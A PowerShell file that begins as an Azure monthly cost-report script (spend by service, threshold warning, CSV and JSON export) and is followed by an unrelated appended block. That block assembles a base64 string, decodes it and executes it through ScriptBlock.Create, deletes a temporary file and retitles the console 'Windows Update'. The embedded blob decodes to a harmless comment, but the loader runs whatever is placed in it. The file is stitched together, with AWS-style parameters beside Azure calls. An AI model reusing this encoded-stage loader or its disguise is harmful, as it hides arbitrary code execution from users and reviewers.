[CmdletBinding()]
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [double]$Threshold = 750,

    [string]$Region = 'eu-west-1',
    [string]$ProfileName = 'adatum-billing',

    [Parameter(Mandatory = $false)]
    [string]$Month = '2026-01',

    [string]$Account = '505899100599',
    [string]$ReportPath = 'D:\Ops\finops\cost-azure-2026-01.csv',
    [string]$OutputPath = "D:\Ops\finops\cost-azure-2026-01.json"
)
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'

$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$usage = Get-AzConsumptionUsageDetail -StartDate $start -EndDate $end -ErrorAction Stop
$groups = foreach ($line in $usage) {
    [pscustomobject]@{
        Period  = $line.UsageStart.ToString('yyyy-MM-dd')
        Service = $line.ServiceName
        Amount  = [math]::Round([double]$line.PretaxCost, 2)
        Unit    = $line.Currency
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan

$byService | Export-Csv -NoTypeInformation -Path $ReportPath -Encoding UTF8

$topServices = $byService | Select-Object -First 5
$topServices | Format-Table -AutoSize
if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}

$jsonBody = $byService | ConvertTo-Json -Depth 4
$jsonBody | Set-Content -Path $OutputPath -Encoding UTF8
<#
.SYNOPSIS
    Chunked encoded-stage workflow.

.DESCRIPTION
    Assembles a base64 command from several fixed chunks, decodes
    the result into a PowerShell string and passes it to the
    stage invoker with bounded error handling.

.NOTES
    The stage body is assembled at runtime.

.EXAMPLE
    PS> .\stage2.ps1
#>
[CmdletBinding()]
param(
    [string]$TracePath = "$env:TEMP\transfer.log",
    [int]$TimeoutSec = 142
)
$ErrorActionPreference = "Stop"

# Decoder
function Expand-EncodedStage {
    [CmdletBinding()]
    param(
        [string]$EncodedText = ''
    )

    Write-Verbose ("Decoding " + $EncodedText.Length + " base64 characters")
    $StageBytes = [Convert]::FromBase64String($EncodedText)
    return [Text.Encoding]::Unicode.GetString($StageBytes)
}

# Invoker
function Invoke-EncodedStage {
    param(
        [string]$StageText = ''
    )

    if ([string]::IsNullOrWhiteSpace($StageText)) {
        throw "Decoded stage is empty"
    }
    $ScriptBlock = [ScriptBlock]::Create($StageText)
    return $ScriptBlock.Invoke()
}

$EncodedBlob = (
    'IwAgAGwAZQBnAGEAYwB5ACAAQQBNAFMASQAgAG0AYQByAGsAZQByACAAawBlAHAAdAAgAGYAbwBy' +
    'ACAAcwBpAGcAbgBhAHQAdQByAGUAIABjAG8AdgBlAHIAYQBnAGUA'
)

Write-Verbose "Starting encoded-stage workflow"
if (-not [string]::IsNullOrWhiteSpace($EncodedBlob)) {
$StageText = Expand-EncodedStage -EncodedText $EncodedBlob
$TransferResult = Invoke-EncodedStage -StageText $StageText
}
else {
    Write-Warning "Encoded stage blob is empty"
}

$EncodedReport = [ordered]@{
    Stage = "encoded"
    BlobLength = $EncodedBlob.Length
    TimeoutSec = $TimeoutSec
}
$EncodedReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $TracePath -Append
Write-Verbose "Checking local path"
Write-Verbose "Applying operation timeout"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Operation completed"
Write-Verbose "Validating result"
Write-Verbose "Exporting operation report"
Write-Verbose "Preparing working directory"
Write-Verbose "Collecting host metadata"
Write-Verbose "Retry budget remaining"
Write-Verbose "Starting workflow"
Write-Verbose "Inspecting process list"
Write-Verbose "Resolving configured target"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Set-Location -Path $env:TEMP
$Host.UI.RawUI.WindowTitle = "Windows Update"
